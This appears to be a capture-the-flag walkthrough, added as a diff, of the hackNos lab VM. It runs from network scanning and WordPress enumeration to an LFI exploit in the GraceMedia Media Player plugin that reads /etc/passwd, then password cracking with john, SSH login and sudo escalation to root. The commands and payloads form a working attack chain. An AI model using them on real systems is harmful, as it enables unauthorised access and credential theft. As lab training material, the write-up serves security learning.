@@ -1,0 +1,230 @@
+[*]
+1. Discover host: nmap -sn 172.16.16.0/24
+Nmap scan report for 172.16.16.2
+Host is up (0.00011s latency).
+MAC Address: 52:54:00:12:35:00 (QEMU virtual NIC)
+Nmap scan report for 172.16.16.3
+Host is up (0.000084s latency).
+MAC Address: 08:00:27:69:B5:42 (Oracle VirtualBox virtual NIC)
+Nmap scan report for 172.16.16.26
+Host is up (0.00025s latency).
+MAC Address: 08:00:27:0A:81:20 (Oracle VirtualBox virtual NIC)
+Nmap scan report for 172.16.16.4
+Host is up.
+[*]
+2. Run scan: nmap -sS 172.16.16.26 --open
+Nmap scan report for 172.16.16.26
+Host is up (0.00018s latency).
+Not shown: 998 closed ports
+PORT   STATE SERVICE
+22/tcp open  ssh
+80/tcp open  http
+[*]
+3. Service scan: nmap -sV 172.16.16.26 -p 22,80
+22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
+MAC Address: 08:00:27:0A:81:20 (Oracle VirtualBox virtual NIC)
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
+[*]
+4. Background nmap scan for UDP: nmap -sU -p- 172.16.16.26 -T4 --open
+[*]
+5. Check banner: ssh 172.16.16.26 **nobanner**
+[*]
+6. Checked splash page at http://172.16.16.26/, and saw the default apache page.
+[*]
+7. nikto -h 172.16.16.26
++ Server: Apache/2.4.29 (Ubuntu)
++ The anti-clickjacking X-Frame-Options header is not present.
++ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
++ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
++ No CGI Directories found (use '-C all' to force check all possible dirs)
++ Apache/2.4.29 appears to be outdated (current is at least Apache/2.4.37). Apache 2.2.34 is the EOL for the 2.x branch.
++ Server may leak inodes via ETags, header found with file /, inode: 2aa6, size: 5978e3d67036e, mtime: gzip
++ Allowed HTTP Methods: GET, POST, OPTIONS, HEAD 
++ Uncommon header 'link' found, with multiple values: (<http://172.16.16.26/tsweb/index.php/wp-json/>; rel="https://api.w.org/",<http://172.16.16.26/tsweb/>; rel=shortlink,)
++ /tsweb/: Microsoft TSAC found. http://www.dslwebserver.com/main/fr_index.html?/main/sbs-Terminal-Services-Advanced-Client-Configuration.html
++ OSVDB-3233: /icons/README: Apache default file found.
++ 7889 requests: 0 error(s) and 9 item(s) reported on remote host
++ End Time:           2019-12-13 22:10:01 (GMT-6) (69 seconds)
+[*]
+8. Ran dirb
+---- Scanning URL: http://172.16.16.26/ ----
++ http://172.16.16.26/index.html (CODE:200|SIZE:10918)                            
++ http://172.16.16.26/server-status (CODE:403|SIZE:277)                           
+==> DIRECTORY: http://172.16.16.26/tsweb/                                         
+                                                                                  
+---- Entering directory: http://172.16.16.26/tsweb/ ----
++ http://172.16.16.26/tsweb/index.php (CODE:301|SIZE:0)                           
+==> DIRECTORY: http://172.16.16.26/tsweb/wp-admin/                                
+==> DIRECTORY: http://172.16.16.26/tsweb/wp-content/                              
+==> DIRECTORY: http://172.16.16.26/tsweb/wp-includes/    
+[*]
+9. Attempted LFI, and RFI
+http://172.16.16.26/http://172.16.16.4
+http://172.16.16.26/../../../etc/passwd
+[*]
+10. Attempted admin/admin admin/password at wordpress login @ /tsweb/wp-admin
+[*]
+11. No interesting comments found in wordpress blog code.
+[*]
+12. Ran wpscan
+[i] It seems like you have not updated the database for some time
+[i] Last database update: 2019-10-19
+[?] Do you want to update now? [Y]es  [N]o  [A]bort update, default: [N] > Y
+[i] Updating the Database ...
+[i] Update completed
+[+] URL: http://172.16.16.26/tsweb/
+[+] Started: Fri Dec 13 22:22:00 2019
+
+[+] Interesting header: LINK: <http://172.16.16.26/tsweb/index.php/wp-json/>; rel="https://api.w.org/"
+[+] Interesting header: LINK: <http://172.16.16.26/tsweb/>; rel=shortlink
+[+] Interesting header: SERVER: Apache/2.4.29 (Ubuntu)
+[+] XML-RPC Interface available under: http://172.16.16.26/tsweb/xmlrpc.php   [HTTP 405]
+[+] Found an RSS Feed: http://172.16.16.26/tsweb/index.php/feed/   [HTTP 200]
+[!] Detected 1 user from RSS feed:
++------+
+| Name |
++------+
+| user |
++------+
+[!] Upload directory has directory listing enabled: http://172.16.16.26/tsweb/wp-content/uploads/
+[!] Includes directory has directory listing enabled: http://172.16.16.26/tsweb/wp-includes/
+
+[+] Enumerating WordPress version ...
+
+[+] WordPress version 5.3.1 (Released on 2019-12-12) identified from meta generator, links opml
+
+[+] WordPress theme in use: twentytwenty - v1.0
+
+[+] Name: twentytwenty - v1.0
+ |  Last updated: 2019-12-13T00:00:00.000Z
+ |  Location: http://172.16.16.26/tsweb/wp-content/themes/twentytwenty/
+ |  Readme: http://172.16.16.26/tsweb/wp-content/themes/twentytwenty/readme.txt
+[!] The version is out of date, the latest version is 1.1
+ |  Style URL: http://172.16.16.26/tsweb/wp-content/themes/twentytwenty/style.css
+ |  Theme Name: Twenty Twenty
+ |  Theme URI: https://wordpress.org/themes/twentytwenty/
+ |  Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block edi...
+ |  Author: the WordPress team
+ |  Author URI: https://wordpress.org/
+
+[+] Enumerating plugins from passive detection ...
+ | 1 plugin found:
+
+[+] Name: gracemedia-media-player - v1.0
+ |  Latest version: 1.0 (up to date)
+ |  Last updated: 2013-07-21T15:09:00.000Z
+ |  Location: http://172.16.16.26/tsweb/wp-content/plugins/gracemedia-media-player/
+ |  Readme: http://172.16.16.26/tsweb/wp-content/plugins/gracemedia-media-player/readme.txt
+[!] Directory listing is enabled: http://172.16.16.26/tsweb/wp-content/plugins/gracemedia-media-player/
+
+[!] Title: GraceMedia Media Player 1.0 - Local File Inclusion (LFI)
+    Reference: https://wpvulndb.com/vulnerabilities/9234
+    Reference: https://seclists.org/fulldisclosure/2019/Mar/26
+    Reference: https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-9618
+    Reference: https://www.exploit-db.com/exploits/46537/
+[*]
+13. Checking LFI for grace media player **success**
+http://172.16.16.26/tsweb/wp-content/plugins/gracemedia-media-player/templates/files/ajax_controller.php?ajaxAction=getIds&cfg=../../../../../../../../../../etc/passwd
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-network:x:100:102:systemd Network Management,,,:/run/systemd/netif:/usr/sbin/nologin
+systemd-resolve:x:101:103:systemd Resolver,,,:/run/systemd/resolve:/usr/sbin/nologin
+syslog:x:102:106::/home/syslog:/usr/sbin/nologin
+messagebus:x:103:107::/nonexistent:/usr/sbin/nologin
+_apt:x:104:65534::/nonexistent:/usr/sbin/nologin
+lxd:x:105:65534::/var/lib/lxd/:/bin/false
+uuidd:x:106:110::/run/uuidd:/usr/sbin/nologin
+dnsmasq:x:107:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
+landscape:x:108:112::/var/lib/landscape:/usr/sbin/nologin
+pollinate:x:109:1::/var/cache/pollinate:/bin/false
+sshd:x:110:65534::/run/sshd:/usr/sbin/nologin
+rohit:x:1000:1000:hackNos:/home/rohit:/bin/bash
+mysql:x:111:114:MySQL Server,,,:/nonexistent:/bin/false
+flag:$1$flag$vqjCxzjtRc7PofLYS2lWf/:1001:1003::/home/flag:/bin/rbash
+[*]
+14. Found first flag
+flag:$1$flag$vqjCxzjtRc7PofLYS2lWf/
+[*]
+15. This appears to be a MD5 password with salt
+john --wordlist=/usr/share/wordlists/rockyou.txt flag.hash --show
+topsecret        (flag)
+[*]
+16. SSH into box: ssh flag@172.16.16.26
+[*]
+17. realized we are in a restrictive shell
+-rbash: /bin/bash: restricted:
+[*]
+18. During enumeration, found cron script that backups the password file
+flag@hacknos:/$ cat /etc/cron.daily/passwd
+#!/bin/sh
+
+cd /var/backups || exit 0
+
+for FILE in passwd group shadow gshadow; do
+        test -f /etc/$FILE              || continue
+        cmp -s $FILE.bak /etc/$FILE     && continue
+        cp -p /etc/$FILE $FILE.bak && chmod 600 $FILE.bak
+done
+
+
+[*]
+19. flag@hacknos:/$ cat /var/backups/passbkp/md5-hash
+$1$rohit$01Dl0NQKtgfeL08fGrggi0
+[*]
+20. Decrypt hash: echo '$1$rohit$01Dl0NQKtgfeL08fGrggi0' > flag.hash && john --wordlist=/usr/share/wordlists/rockyou.txt flag.hash
+!%hack41         (?)
+**on your machine**
+[*]
+21. Assuimg the user would be rohit
+[*]
+22. Oof! We are almost done! rohit is a sudoer
+rohit@hacknos:~$ sudo -l
+[sudo] password for rohit: 
+Matching Defaults entries for rohit on hacknos:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
+
+User rohit may run the following commands on hacknos:
+    (ALL : ALL) ALL
+[*]
+23. Grab that flag
+rohit@hacknos:~$ sudo su -
+root@hacknos:~# ls
+root.txt
+root@hacknos:~# cat root.txt
+ _______                         __              __  __     #
+/       \                       /  |            /  |/  |    #
+$$$$$$$  |  ______    ______   _$$ |_          _$$ |$$ |_   #
+$$ |__$$ | /      \  /      \ / $$   |        / $$  $$   |  #
+$$    $$< /$$$$$$  |/$$$$$$  |$$$$$$/         $$$$$$$$$$/   #
+$$$$$$$  |$$ |  $$ |$$ |  $$ |  $$ | __       / $$  $$   |  # 
+$$ |  $$ |$$ \__$$ |$$ \__$$ |  $$ |/  |      $$$$$$$$$$/   #
+$$ |  $$ |$$    $$/ $$    $$/   $$  $$/         $$ |$$ |    #
+$$/   $$/  $$$$$$/   $$$$$$/     $$$$/          $$/ $$/     #
+#############################################################                                                          
+                                                          
+#############################################################                                                          
+MD5-HASH : bae11ce4f67af91fa58576c1da2aad4b
+
+Blog : www.hackNos.com
+
+Author : Rahul Gehlaut
+
+linkedin : https://www.linkedin.com/in/rahulgehlaut/
+#############################################################
+[*]
